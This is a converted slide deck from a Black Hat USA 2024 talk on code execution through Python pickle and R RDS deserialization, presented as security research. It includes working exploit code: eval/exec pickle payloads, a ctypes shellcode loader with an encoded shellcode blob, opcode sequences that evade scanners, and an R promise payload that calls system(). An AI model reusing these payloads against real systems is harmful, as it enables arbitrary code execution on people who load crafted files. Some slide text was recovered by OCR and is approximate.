---
title: "We R in a Right Pickle With All These Insecure Serialization Formats"
speakers: ["Kasimir Schulz", "Tom Bonner"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Kasimir Schulz & Tom Bonner_We R in a Right Pickle With All These Insecure Serialization Formats.pdf"
pages: 43
sha256: "53bcc782656657ba2395ea42fd7e7849f45f3f1fb59d3b8c51db3db1823eb990"
text_chars: 26030
ocr_pages: 8
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:34:06Z"
---
# We R in a Right Pickle With All These Insecure Serialization Formats

**Speakers:** Kasimir Schulz, Tom Bonner  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Kasimir Schulz & Tom Bonner_We R in a Right Pickle With All These Insecure Serialization Formats.pdf` (43 pages)

## Slide 1

We R in a right pickle with all these insecure serialization formats

Speaker(s): Kasimir Schulz & Tom Bonner

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Co /
blackhat  —_—_ +
USA 2024
AUGUST 7-8, 2024
BRIEFINGS
We R in a right pickle with all these
insecure serialization formats
Speaker(s):
Kasimir Schulz & Tom Bonner
#BHUSA @BlackHatEvents
```

## Slide 2

## Introduction

###### **Kasimir Schulz**

- Principal Security Researcher at HiddenLayer

- linkedin/in/kasimir-schulz

- Socials: @abraxus7331

###### **Tom Bonner**

- VP of Research at HiddenLayer

- ● linkedin/in/thomas-j-bonner

- Socials: @thomas_bonner

#BHUSA  @BlackHatEvents

## Slide 3

## Introduction

- ●We’ve been investigating machine learning libraries and file formats

- ●There’s a huge problem with deserialization of “untrusted” data

- ●We’re going to focus on Pickle and R, but it’s by no means limited to these formats

#BHUSA  @BlackHatEvents

## Slide 4

## Why pickle?

- ●It’s been done! - Marco Slaviero, Sour Pickles in 2011

- ●13 years, many new python versions, a major lack of awareness and several pickle updates later…

#BHUSA  @BlackHatEvents

## Slide 5

## Why pickle?

●Still the big red warning

●Pickle used for ML models, IPC, RPC, etc.

●More vulns than ever

●Mythic/CobaltStrike/Metasploit ●Anti-malware scanners are getting in on the act

●Cat and mouse game

#BHUSA  @BlackHatEvents

## Slide 6

## Pickle recap

●Stack based virtual machine processing byte code

- ●Interleaves instructions and data

- ●Has a stack and memo (like registers)

- ●Code exec via **GLOBAL** , **STACK_GLOBAL** , **INST** , and **REDUCE** opcodes

#BHUSA  @BlackHatEvents

## Slide 7

## Pickle recap

import pickle class Eval: def __reduce__(self) : return eval, (f"print('pwnd!')",) pickle.loads(pickle.dumps(Eval ()))

**__reduce__ returns callable + args tuple to reconstruct the object**

0: \x80 PROTO      4 2: \x95 FRAME      42 11: \x8c SHORT_BINUNICODE 'builtins' 21: \x94 MEMOIZE    (as 0) 22: \x8c SHORT_BINUNICODE 'eval' 28: \x94 MEMOIZE    (as 1) 29: \x93 STACK_GLOBAL 30: \x94 MEMOIZE    (as 2) 31: \x8c SHORT_BINUNICODE "print('pwnd!')" 47: \x94 MEMOIZE    (as 3) 48: \x85 TUPLE1 49: \x94 MEMOIZE    (as 4) 50: R    REDUCE 51: \x94 MEMOIZE    (as 5) 52: .    STOP highest protocol among opcodes = 4

#BHUSA  @BlackHatEvents

## Slide 8

## Oddities

##### ●Certain opcodes are not required…

>>> import pickletools

>>> pickletools.dis(open("basic_eval.pkl", "rb").read()) **0: \x8c SHORT_BINUNICODE 'builtins'**

##### **●PROTO (0x80 + version)**

- Defaults to 0

- Makes it harder to ID pickles

**10: \x8c SHORT_BINUNICODE 'eval'**

**16: \x93 STACK_GLOBAL**

**17: \x8c SHORT_BINUNICODE 'print("pwnd!")'**

**33: \x85 TUPLE1**

- **●FRAME (0x95)**

   - Follows PROTO in version 4+

##### **●STOP (0x2e)**

- Some scanners check for this when ID’ing

- Raises ValueError when disassembling

- ○ Raises EOFError when loading

- The payload still runs though!

**34: R    REDUCE** Traceback (most recent call last): File "<stdin>", line 1, in <module>

File "pickletools.py", line 2448, in dis for opcode, arg, pos in genops(pickle): File "pickletools.py", line 2283, in _genops raise ValueError("pickle exhausted before seeing STOP") ValueError: pickle exhausted before seeing STOP >>> import pickle >>> pickle.load(open("basic_eval.pkl", "rb")) **pwnd!** Traceback (most recent call last): File "<stdin>", line 1, in <module>

EOFError: Ran out of input

#BHUSA  @BlackHatEvents

## Slide 9

## Pickleception

import pickle class Exec: def __reduce__(self) : return exec f , ( "print('pwnd!')",) class Pickle: def __reduce__(self) : import pickle return pickle.loads, ( pickle.dumps(Exec( )),) pickle.loads(pickle.dumps(Pickle ()))

0: \x80 PROTO      4 2: \x95 FRAME      81 11: \x8c SHORT_BINUNICODE '_pickle' 20: \x94 MEMOIZE    (as 0) 21: \x8c SHORT_BINUNICODE 'loads' 28: \x94 MEMOIZE    (as 1) 29: \x93 STACK_GLOBAL 30: \x94 MEMOIZE    (as 2) 31: C    SHORT_BINBYTES b"\x80\x04\x95*\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\ x8c\x04exec\x94\x93\x94\x8c\x0eprint('pwnd!')\x94\x85\x94R\x94." 86: \x94 MEMOIZE    (as 3) 87: \x85 TUPLE1 88: \x94 MEMOIZE    (as 4) 89: R    REDUCE 90: \x94 MEMOIZE    (as 5) 91: .    STOP highest protocol among opcodes = 4

#BHUSA  @BlackHatEvents

## Slide 10

## Pickle shellcode

●Implement a pure shellcode loader (i.e. no calls to exec/eval to run a script)

- ●Use ctypes

- ●LoadLibrary(“kernel32.dll”)

- ●VirtualAlloc

- ●WriteProcessMemory

- ●CreateThread

#BHUSA  @BlackHatEvents

## Slide 11

## Pickle shellcode

import pickle import base64

__SHELLCODE__ =

"amBaaGNhbGNUWUgp1GVIizJIi3YYSIt2EEitSIswSIt+MANXPItcFyiLdB8gSAH+i1QfJA+3LBeNUgKtg TwHV2luRXXvi3QfHEgB/os0rkgB95n/1w=="

__BASE_ADDRESS__ = 0 x 123000000000 __PAYLOAD__ = b ase64.b64decode(__SHELLCODE__) __PAYLOAD_SIZE__ = l en(__PAYLOAD__)

class GetAllocation: def __reduce__(self) : import ctypes return ctypes.c_ulong, (0x1000 | 0 x 2000, )

class GetProtection: def __reduce__(self) : import ctypes return ctypes.c_ulong, (0x40 , )

class GetBaseAddress: def __reduce__(self) : import ctypes return ctypes.c_void_p, ( __BASE_ADDRESS__, )

class GetNullPtr: def __reduce__(self) : import ctypes return ctypes.c_void_p, (0, )

class GetPayloadSize: def __reduce__(self) : import ctypes return ctypes.c_size_t, ( __PAYLOAD_SIZE__, )

class GetProcHandle: def __reduce__(self) : import ctypes return ctypes.c_void_p, (-1, )

#BHUSA  @BlackHatEvents

## Slide 12

## Pickle shellcode

###### class VirtualAlloc:

def __reduce__(self) : return LoadKernel32( ). VirtualAlloc, ( GetBaseAddress( ), GetPayloadSize( ), GetAllocation( ), GetProtection( ), )

class GetPayload: def __reduce__(self) : import base64 return base64.b64decode, ( __SHELLCODE__, )

###### class WriteProcessMemory:

def __reduce__(self) :

return LoadKernel32( ). WriteProcessMemory, ( GetProcHandle( ), GetBaseAddress( ), GetPayload( ), GetPayloadSize( ), GetNullPtr( ), )

class LoadKernel32:

def VirtualAlloc(self) : pass def WriteProcessMemory(self) : pass def CreateThread(self) : pass def __reduce__(self) : import ctypes return ctypes.WinDLL, (" kernel32.dll " , )

###### class CreateThread:

def __reduce__(self) : return LoadKernel32( ). CreateThread, ( GetNullPtr( ), GetNullPtr( ), GetBaseAddress( ), GetNullPtr( ), GetNullPtr( ), GetNullPtr(), )

with open("shellcode.pkl", "wb") as pfile: pickle.dump([VirtualAlloc(), WriteProcessMemory(), CreateThread()], pfile)

#BHUSA  @BlackHatEvents

## Slide 13

## Pickle shellcode

>python
Python 3.12.0 (tags/v3.12.0:0fb18b0, Oct  2 2023, 13:03:39) [MSC v.1935 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import pickle
>>> pickle.load(open("shellcode.pkl", "rb"))
[0, 1, 432]
>>>

#BHUSA  @BlackHatEvents

## Slide 14

## Pickle assembly

- ●We need a way to craft pickles

- ●Hex editor was becoming a pain!

- ●We created a disassembler and assembler

- ●Now we can create highly bespoke payloads

- ●Generate sequences of opcodes not possible using pickle.dump(s)

#BHUSA  @BlackHatEvents

## Slide 15

## Pickle assembly

Instruction('proto', 4),

Instruction('proto', 4),

Instruction('short_binunicode', 'builtins'), Instruction('short_binunicode', 'eval.__call__'),

Instruction('stack_global', None),

Instruction('short_binunicode', '__main__'), Instruction('short_binunicode', '__builtins__.exec'), Instruction('stack_global', None),

Instruction('short_binunicode', 'print("pwnd!")'),

Instruction('short_binunicode', 'print("pwnd!")'),

Instruction('tuple1', None), Instruction('reduce', None),

Instruction('tuple1', None), Instruction('reduce', None),

Instruction('stop', None),

Instruction('stop', None)

#BHUSA  @BlackHatEvents

## Slide 16

## Pickle assembly

Instruction('proto', 4),

# Get string join function Instruction('short_binunicode', 'builtins'), Instruction('short_binunicode', 'str.join'), Instruction('stack_global', None),

# Create the string that will be added to each iterator Instruction('short_binunicode', ''), # Create the list of words to append together Instruction('empty_list', None), Instruction('mark', None),

# Build exec string

Instruction('short_binunicode', 'e'), Instruction('short_binunicode', 'x'), Instruction('short_binunicode', 'e'), Instruction('short_binunicode', 'c'),

# Call str.join([...]) Instruction('reduce', None), Instruction('memoize', None),

# Add builtins to the stack Instruction('short_binunicode', 'builtins'), Instruction('memoize', None), Instruction('none', None),

# Swap exec and builtins Instruction('binget', 1), Instruction('binget', 0),

# Get builtins.exec method Instruction('stack_global', None),

# Create parameters for exec Instruction('short_binunicode', 'print("pwnd!")'), Instruction('tuple1', None),

# Append all words to the list Instruction('appends', None),

# Run exec(args) Instruction('reduce', None),

# Create the parameters for str.join Instruction('tuple2', None),

# Done. Instruction('stop', None)

#BHUSA  @BlackHatEvents

## Slide 17

## Pickle function/lambda

- ●Not possible to pickle code objects

- ●Recommended to use dill

- ●Other option is to use marshal.dump/load

- ●Or…

#BHUSA  @BlackHatEvents

## Slide 18

## Pickle function/lambda

import pickle import pickletools import copyreg import types def code_ctor(*args): return types.CodeType( * args) def code_reduce(code): return code_ctor, ( code. co_argcount, code. co_posonlyargcount, code. co_kwonlyargcount, code. co_nlocals, code. co_stacksize, code. co_flags, code. co_code, code. co_consts, code. co_names, code. co_varnames, code. co_filename, code. co_name, code. co_firstlineno, code. co_lnotab)

if __name__ == "__main__": code = lambda x: exec( x) p = pickle.dumps(code.__code__) pickletools.dis( p)

types.FunctionType(pickle.loads(p), globals())("print('pwnd!')")

copyreg.pickle(types.CodeType, code_reduce)

#BHUSA  @BlackHatEvents

## Slide 19

## Pickle function/lambda

Instruction('proto', 4), Instruction('short_binunicode', 'x'), Instruction('short_binunicode', 'types'), Instruction('tuple1', None), Instruction('short_binunicode', 'FunctionType'), Instruction('short_binunicode', 'lambda.py'), Instruction('stack_global', None), Instruction('short_binunicode', '<lambda>'), Instruction('short_binunicode', 'types'), Instruction('binint1', 42), Instruction('short_binunicode', 'CodeType'), Instruction('short_binbytes', b''), Instruction('stack_global', None), Instruction('tuple', None), Instruction('mark', None), Instruction('reduce', None), Instruction('binint1', 1), Instruction('short_binunicode', 'builtins'), Instruction('binint1', 0), Instruction('short_binunicode', 'globals'), Instruction('binint1', 0), Instruction('stack_global', None), Instruction('binint1', 1), Instruction('empty_tuple', None), Instruction('binint1', 3), Instruction('reduce', None), Instruction('binint1', 67), Instruction('tuple2', None), Instruction('short_binbytes', b't\x00d\x01|\x00\x83\x02S\x00'), Instruction('reduce', None), Instruction('none', None), Instruction('short_binunicode', 'world'), Instruction('short_binunicode', 'Hello, '), Instruction('tuple1', None), Instruction('tuple2', None), Instruction('reduce', None), Instruction('short_binunicode', 'print'), Instruction('stop', None), Instruction('tuple1', None),

#BHUSA  @BlackHatEvents

## Slide 20

## Pickle function/lambda

●We provide a **create_generative_pickle()** method with our disassembler/compiler:

def pwn (): import os, time x = input( ) os. system( f"echo '{x}, pwned by HiddenLayer at {time.time()}'") data = c reate_generative_pickle(pwn) pickle.loads(data)

- ●Caveats…

   - Python version specific!

#BHUSA  @BlackHatEvents

## Slide 21

## Unpickler manipulation

●Is it possible to modify the pickle input stream?

●Sadly, no, the Unpickler only takes a read() callback

- ●Is it possible to gain access to the Unpickler() class whilst loading?

●If we could, what could we target?

def load(self) :

""" Read a pickled object representation from the open file.

Return the reconstituted object hierarchy specified in the file. """ # Check whether Unpickler was initialized correctly. This is # only needed to mimic the behavior of _pickle.Unpickler.dump(). if not hasattr(self, " _file_read " ) : raise UnpicklingError(" Unpickler.__init__() was not called by " "%s .__init__() " % ( self.__class__.__name__, )) self. _unframer = _Unframer( self. _file_read, self. _file_readline) self. read = self. _unframer.read self. readinto = self. _unframer.readinto self. readline = self. _unframer.readline self. metastack = [] self. stack = [] self. append = self. stack. append self. proto = 0 read = self. read dispatch = self.dispatch try: while True: key = read( 1) if not key: raise EOFError assert isinstance(key, bytes_types) dispatch[key[0]](self) except _Stop as stopinst: return stopinst.value

#BHUSA  @BlackHatEvents

## Slide 22

## Unpickler manipulation

Instruction('proto', 4),

Instruction('short_binunicode', 'operator'), Instruction('short_binunicode', 'getitem'), Instruction('stack_global', None),

###### # operator.attrgetter("dispatch")

Instruction('short_binunicode', 'operator'), Instruction('short_binunicode', 'attrgetter'), Instruction('stack_global', None), Instruction('short_binunicode', 'dispatch'), Instruction('tuple1', None), Instruction('reduce', None),

Instruction('short_binunicode', 'builtins'), Instruction('short_binunicode', 'dict.get'), Instruction('stack_global', None),

###### # locals()

Instruction('short_binunicode', 'builtins'), Instruction('short_binunicode', 'locals'), Instruction('stack_global', None), Instruction('empty_tuple', None), Instruction('reduce', None),

###### # dict.get(locals().self)

Instruction('short_binunicode', 'self'), Instruction('tuple2', None), Instruction( ' reduce ' , None) ,

# operator.attrgetter("dispatch")(self) Instruction('tuple1', None), Instruction('reduce', None), Instruction('memoize', None),

# operator.getitem(self.dispatch, 140) -> load_short_binunicode Instruction('binint1', 140), Instruction('tuple2', None), Instruction('reduce', None), Instruction('memoize', None),

# self.dispatch[56] = load_short_binunicode - register new opcode handler in dispatch table Instruction('binget', 0), Instruction('binint1', 56), Instruction('binget', 1), Instruction('setitem', None),

# Use new short_binunicode opcode (56) Instruction(' short_binunicode_bad' , 'builtins'), Instruction(' short_binunicode_bad' , 'exec'), Instruction('stack_global', None), Instruction('short_binunicode', 'print("pwnd")'), Instruction('tuple1', None),

# exec Instruction('reduce', None), Instruction('stop', None), Instruction( ' stop ' , None) ,

#BHUSA  @BlackHatEvents

## Slide 23

## Unpickler manipulation

●Possible to add custom opcode handlers to the dispatch table (Python only, not C)

●Causes the pickletools disassembler to crash ○ ValueError: at position 137, opcode b'8' unknown ●Combine with lambda/function pickling to add code to the dispatch table!

# Use the faster _pickle if possible try: from _pickle import ( PickleError, PicklingError, UnpicklingError, Pickler, Unpickler, dump, dumps, load, loads ) except ImportError: Pickler, Unpickler = _Pickler, _Unpickler dump, dumps, load, loads = _dump, _dumps, _load, _loads

●Works out of the box for joblib

#BHUSA  @BlackHatEvents

## Slide 24

#BHUSA  @BlackHatEvents

## Slide 25

## Why R(DS)?

R’s wide use in the Data Science and Statistics communities makes a vulnerability highly impactful

R’s serialization format uses bytecode and an interpreter similar to Python Pickle

R hadn’t undergone much security scrutiny, evidenced by only 1 previous CVE

#BHUSA  @BlackHatEvents

## Slide 26

## The RDS File

The RDS Format is used for saving the state of an R object so that it can be reloaded and reused in future R sessions with common use cases being

- **Saving Workspaces** : Save the entire R workspace to reload later

- **Saving Individual Objects** : Save specific R objects for reuse in different scripts or sessions

- ● **Sharing Data:** Share serialized objects with other R users or applications

- **Persistence** : Store R objects persistently between R sessions

**saveRDS** is used for serialize data while **readRDS** is used to deserialize data

#BHUSA  @BlackHatEvents

## Slide 27

## The RDS Format

- ●Parsed in the **R_Unserialize**

- ●3 Different Format Types

   - Ascii

   - Binary

   - XDR

- ●Field sizes are determined once the format type has been parsed

- ●Different versions have different header values, such as the encoding name

- ●After parsing the header the rest of the data gets treated like bytecode

Byte Values based on Binary or XDR Format

#BHUSA  @BlackHatEvents

## Slide 28

## RDS Virtual Machine

●The R Virtual Machine has **36** possible bytecode instructions which create objects like:

   - Lists (Logical, Integer, Numeric, Complex, Character, or Raw bytes)

   - Symbols

   - ○ Functions

   - Environments

- ●The virtual machine is a recursive function call into **ReadItem** called from **R_Unserialize**

   - The virtual machine returns one complete object

- ●All instructions start with a four byte flag encoded with necessary data which is followed by variable length data

#BHUSA  @BlackHatEvents

## Slide 29

## Instructional Quirks

●The BCODESXP instruction, used for creating bytecode, requires a strict format following the instruction to parse constants and instructions

●OBJSXP will create an S4 object while returning a VECSXP can create an S3 object ●There are some instructions which lets you generate lists of objects and instructions to be set in a certain way:

- LISTSXP

- LANGSXP

- CLOSXP

- PROMSXP

- DOTSXP

But how did we use the instructions to make our exploit?

#BHUSA  @BlackHatEvents

## Slide 30

## A Promiseing Object

##### R’s Lazy Evaluation

- ●Lazy evaluation is a strategy where expressions are not evaluated until their values are actually needed which improves efficiency by avoiding unnecessary computations and supports flexible and dynamic programming

- ●How does this work?

   - Function arguments are not evaluated when the function is called but when they are actually used inside the function

   - Unevaluated expressions are stored as "thunks," which contain the expression and its environment

- When an argument is accessed, the stored expression is evaluated in its environment

- ●The PROMSXP Object:

   - **Expression** : The unevaluated R expression

   - **Environment** : The environment in which the expression should be evaluated

   - **Value** : The result of the evaluation, stored once the expression is evaluated

#BHUSA  @BlackHatEvents

## Slide 31

## Crafting the Exploit

#BHUSA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat | )
USA 2024 ,
Crafting the Exploit
Opcode(TYPES.PR , 0, False, False, False,None,False),
Opcode( TYPES. P, 0, False, False, False,None,False),
Opcode( TYPES.LAN , ©, False, False, False,None,False),
Opcode(TYPES.SYMSXP, 0, False, False, False,None,False),
Opcode(TYPES.LI: , 0, False, False, False,None,False),
Opcode(TYPES.STRSXP, 0, False, False, False,1,False),
Opcode( TYPES. CHA , False, False, False,'echo "pwned by HiddenLayer"' ,False),
(
(
(
(
Opcode( TYPES. ¢ SXP, , False, False, False,"system",False),
(
(
(
Opcode(TYPES. \LU , 0, False, False, False,None,False),
```

## Slide 32

## Using the Exploit

The exploit gets executed when the promise is interacted with

The promise can be used as many type of value or object and will run the arbitrary code

The promise can be used as a function parameter

The promise can be “treated” as an object and will run the arbitrary code even if properties don’t exist

#BHUSA  @BlackHatEvents

## Slide 33

## Reviewing the R Patch

- ●R added a function to check whether the top most returned value was a promise object ●Bypasses were found by nesting the promise object within other objects

●The function is only called when going through the **readRDS** function

#BHUSA  @BlackHatEvents

## Slide 34

### Showing the other path with R packages

- ●R packages, like many other objects, are loaded without using the **ReadRDS** function ●R packages specifically are loaded using the **lazyLoad** function

- ●While researching packages to show R some problems with the patch we discovered a few other issues…

#BHUSA  @BlackHatEvents

## Slide 35

#### Looking into LazyLoad

#BHUSA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
biSekhat , ,
USA 2024
Looking into LazyLoad
: ae 5 ; a file attribute_hidden SEXP
unction (filebase, envir = parent.frame(), filter) do_lazyLoadDBfetch(SEXP call, SEXP op, SEXP args, SEXP env)
{
fun <- function(Cdb) { {
vals <- db$vals
vars <- db$vars . key = CAR(args); args = CDR(args);
expr <- quote(lazyLoadDBfetch(key, datafile, compressed, file = CAR(args); args = CDR(args);
envhook)) —— ,
.Internal(makeLazy(vars, vals, expr, db, envir))
} . . PROTECT_WITH_INDEX(val = readRawFromFile(file, key), &vpi);
LazyLoadDBexec(filebase, fun, filter)
} val = R_unserialize(val, hook);
<bytecode: Qx15bfcf258> if (TYPEOF( val) — PROMSXP ) {
<environment: namespace: base> REPROTECT(val, vpi);
val = eval(val, R_GlobalEnv);
ENSURE_NAMEDMAX( val);
> LazyLoadDBfetch }
function (key, file, compressed, hook) .Primitive("lazyLoadDBfetch") UNPROTECT(1);
return val;
```

## Slide 36

## R Packages

Where can people get R packages?

●The Comprehensive R Archive Network (CRAN): 21,122 packages

- ●R Forge: 2,146 packages

●Bioconductor: 3,691 packages How do R packages get loaded?

●File named with the same name as the package is run

●LazyLoad is run using the RDX and RDB files

#BHUSA  @BlackHatEvents

## Slide 37

## Tearing Apart Packages

#BHUSA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
RDX File RDB File
Offset from File Start | Length of Data (Including Header and Data) Leen Decompressed Length (4 bytes) | Compressed Serialized Data
Offset from File Start | Length of Data (Including Header and Data) Li ee Decompressed Length (4 bytes) | Compressed Serialized Data
Offset from File Start | Length of Data (Including Header and Data) H——————* Decompressed Length (4 bytes) | Compressed Serialized Data
```

## Slide 38

## delayedAssign in Packages

#BHUSA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
USA 2024
delayedAssign in Packages
Version: 0.5.1
Depends: R (= 3.5.0)
Imports: babynames, dplyr, forcats, fueleconomy, gapminder, ggplot2, Lahman, nasaweather, nycflights13, palmerpenguins, modeldata (2 1.0.0), rlang, tibble, tidyr, yaml
Suggests: covr, testthat (= 2.1.0)
Published: 2023-07-17
DOI: 10.32614/CRAN.package.datos
Author: Riva Quiroga [aut, cre], Edgar Ruiz [aut], Mauricio Vargas [aut], Mauro Lepore [aut], Rayna Harris [ctb], Daniela Vasquez [ctb], Joshua Kunst [ctb]
Maintainer: Riva Quiroga <riva.quiroga at uc.cl>
BugReports: https://github.com/cienciadedatos/datos/issues
License: cco
URL: https://github.com/cienciadedatos/datos
NeedsCompilation: no
Language: es
Materials: README NEWS
CRAN checks: datos results
delayedAssign('aerolineas',
eval(parse(file.path(system.file('scripts','aerolineas.txt', package = 'datos')))))
delayedAssign('aeropuertos',
eval(parse(file.path(system.file('scripts', 'aeropuertos.txt', package = ‘'datos')))))
delayedAssign('atmosfera',
eval(parse(file.path(system. file('scripts', 'atmosfera.txt', package = 'datos')))))
```

## Slide 39

## delayedAssign in Packages

#BHUSA  @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
delayedAssign in Packages
. datos / inst / scripts / aerolineas.txt 4 Top
{1 Files Hinst scrips
= a Code | Blame 67 lines (66 loc) - 2.1 KB rw (OO 4) A ~
main ial Sere
36 it (“tactor™ %in% class(cl)) +
Q Gotofile t 37 lv <- levels(cl)
39 Wy == from[il] <- tolil
v scripts 40 }
aerolineas.tx a2 yess {
(} aeropuertos.txt 43 for (i in seq_along(from)) cl{cl == from[i]] <- to[i]
44 }
{} atmosfera.txt 45 }
{} aviones.txt ze ch
47 +
{}) bateadores.txt 48 )
. 49 dfl <- setNames(dfl, new_names)
( clima.txt wes .
50 if (type_df == "tibble") dfl <- dplyr::as_tibble(df1l)
B comunes.txt 51 if (type_df == “grouped_df") {
52 grps_t <- as.character(lapply(grps, function(x) new_names[var_names x]))
[5 datos_credito.txt 53 dfl <- dplyr::as_tibble(dfl)
[5 diamantes.txt 54 dfl <- dplyr::group_by(dfl, !!!rlang::parse_exprs(grps_t))
55 }
(1 dirigentes.txt 56 if (type_df == “data.frame") {
5 fated 57 if (!is.null(row_names)) {
SNCUesta: Ue 58 dfl <- as.data.frame(df1l)
1) fiel.txt 59 rownames(dfl) <- row_names
60 } else {
& flores.txt 61 dfl <- as.data. frame(df1)
{} jardineros.txt b2 }
63 +
[} lanzadores.txt 64 dfl
65 }
illas.
D millas.txt 66 translate(‘airlines.yml')
{} mtautos.txt
)
```

## Slide 40

### Open-Source Contribution: HiddenPickle

##### **Disassembler**

●Allows users to disassemble pickle files without running arbitrary code

##### **Patcher**

- ●Allows users to hook specific instructions to alter values

- ●Allows users to remove or add instructions when patterns are detected

##### **Compiler**

- ●Allows users to compile new pickle files

- Programs can be compiled programmatically or be manually created

- ●Allows users to have complete control over instructions allowing them to create all of the attacks we have outlined in the slides

##### **Dynamic Function Pickle**

#BHUSA  @BlackHatEvents

## Slide 41

## Open-Source Contribution: HiddenR

##### **Disassembler**

- ●Allows users to disassemble R files without running arbitrary code

- ●Allows users to programmatically traverse through objects in an RDS file

##### **Package Explorer**

- ●Allows users to automatically disassemble RDX and RDB files in an R package ●Allows users to scan RDS, RDX, and RDB files for malicious code

##### **Compiler**

- ●Allows users to compile new RDS files

- ●Allows users to inject code into RDB files

#BHUSA  @BlackHatEvents

## Slide 42

## BlackHat Sound Bytes

- ●Ensure your deserialization method matches your needs and avoid unnecessary code execution. Always secure your process, assuming users might deserialize malicious data.

- ●Attackers should scrutinize deserialization processes for potential exploits. If the deserialization involves executing instructions, it's likely exploitable. Once arbitrary code execution is possible, defenses will be difficult to fully secure, leaving room for bypasses.

- ●To effectively protect file formats, a deep understanding of their internal workings is essential. Scanners that only detect basic patterns without this knowledge will fall short in providing true protection.

#BHUSA  @BlackHatEvents

## Slide 43

# **Q&A**

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
~~
Q
black hat —
USA 2
q
O24
Q&A
#BHUSA @BlackHatEvents
```
